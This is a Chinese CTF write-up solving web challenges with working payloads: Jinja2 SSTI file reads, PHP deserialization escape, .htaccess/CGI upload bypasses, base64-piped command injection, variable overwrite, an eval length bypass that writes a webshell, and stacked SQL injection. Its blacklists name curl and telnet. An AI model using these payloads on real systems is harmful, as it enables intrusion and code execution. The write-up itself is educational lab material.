+<p><code>().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__</code><br>
+还是没能搞出来<br>
+最后还是通过读文件的方式，首先尝试<code>proc/self/cwd</code>和<code>/proc/self/environ</code>，直接返回500，应该是权限不够，再尝试读取<code>/proc/self/cmdline</code>，显示项目是在<code>/app</code>下面，再看<code>/app/app.py</code>发现可以成功读取源码，那就猜了一波flag应该在这个路径下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
+<p>参考：<br>
+<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a><br>
+<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#flask-%E6%94%B9">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass</a></p>
+<p>赛后看预期解我好像做的太麻烦了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>header的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x: __init__</span><br><span class="line">x1: __globals__</span><br><span class="line">x2: __builtins__</span><br><span class="line">x3: open</span><br><span class="line">x4: app.py(flag.txt)</span><br></pre></td></tr></table></figure>
+<h2 id="easyunserialize-solved">easyunserialize [solved]</h2>
+<p>反序列化字符逃逸<br>
+Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="babyeval-solved">babyeval [solved]</h2>
+<p>命令执行可以直接包含文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="easyfind-solved">easyfind [solved]</h2>
+<p>一开始不给hint都没什么思路，后来放了一个hint：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure>
+<p>is_file函数接收一个数组的时候回返回Null</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]&#x3D;0</span><br></pre></td></tr></table></figure>
+<h2 id="easy-upload-solved">easy_upload [solved]</h2>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119105131.png" alt=""></p>
+<p>检查文件名后缀、文件类型，过滤了<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</code>，不检查是否有图片头。</p>
+<p><code>.htaccess</code>文件名是可以上传的，用换行绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">ph5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure>
+<p>然后在随便上传一个txt文件，访问对应路径即可。</p>
+<p>然后我写wp的时候发现，这道题目过滤被改了，增加了一个<code>\</code>，所以上面的这种换行绕过就没办法bypass了。</p>
+<p>来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119130328.png" alt=""></p>
+<p>再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+<p>然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。</p>
+<h2 id="UN’s-online-tools-solved">UN’s_online_tools [solved]</h2>
+<p>命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和<code>$</code>，用<code>%09</code>来绕过。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119131410.png" alt=""></p>
+<p>从源码中可以看到禁用了<code>/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i</code></p>
+<p>用ls命令看到flag在根目录下，base64编码一下</p>
+<p><code>127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119133907.png" alt=""></p>
+<h2 id="easyphp">easyphp</h2>
+<p>PHP代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。</p>
+<p>第一关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$&#123;$key&#125;=$value</code>可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D;</span><br></pre></td></tr></table></figure>
+<p>第二关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure>
+<p>简单的PHP弱类型绕过，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p>
+</blockquote>
+<p>第三关</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>变量名必须是<code>var1</code>或者<code>var12</code>这种形式，而且在变量覆盖环节转义了单双引号。</p>
+<p>关于复杂变量的解析：<a href="https://ca0y1h.top/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/">https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/</a></p>
+<p>Payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1=&#123;$_GET[<span class="number">1</span>]&#125;&amp;var3=$&#123;$var1()&#125;&amp;<span class="number">1</span>=phpinfo</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="L0vePHP">L0vePHP</h2>
+<p>查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。</p>
+<p>解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>, $action)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>hint用十六进制转码<code>1nD3x.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>);</span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>预期解，利用PHP5.6新引入的特性——变长参数</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
+<p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assert</span><br><span class="line">POST</span><br><span class="line">code&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure>
+<p>也就是相当于执行了<code>usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert);</code></p>
+<p>P年的那篇文章还提到了可以利用文件包含写shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure>
+<p>用脚本自动跑一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = <span class="string">&quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;</span>.format(s)</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="comment"># print(res.status_code)</span></span><br></pre></td></tr></table></figure>
+<p>base64编码后的一句话已经写入了A文件，再文件包含这个A文件。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201118212038.png" alt=""></p>
+<h2 id="俄罗斯方块">俄罗斯方块</h2>
+<p>题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117220752.png" alt=""></p>
+<p>拼接一下文件名下载下来解压之后拿到<code>blocks.wasm</code>，再用wabt工具集中的wasm2wat对其进行反编译</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p>
+<p><a target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html">https://webassembly.github.io/wabt/doc/wasm2wat.1.html</a></p>
+</blockquote>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221818.png" alt=""></p>
+<p>反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221631.png" alt=""></p>
+<p>再修改这个分数，最后编译成wasm文件</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221929.png" alt=""></p>
+<p>把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117231202.png" alt=""></p>
+<h2 id="ezphp">ezphp</h2>
+<p>题目这样出我真的。。。。没想到</p>
+<p>并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">True</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">True</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>POST参数即可得到flag</p>
+<h2 id="checkin-sql">checkin-sql</h2>
+<p>强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。</p>
+<p>堆叠注入查表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;show tables;</span><br></pre></td></tr></table></figure>
+<p>查表字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;desc 0xDktb;</span><br></pre></td></tr></table></figure>
+<p>用预处理和十六进制编码<code>select * from 0xDktb</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql;</span><br></pre></td></tr></table></figure>
+<p>发现被过滤掉了<code>set</code>关键字。（在比赛的时候没想到可以直接不要set语句。。。</p>
+<p>改为：</p>
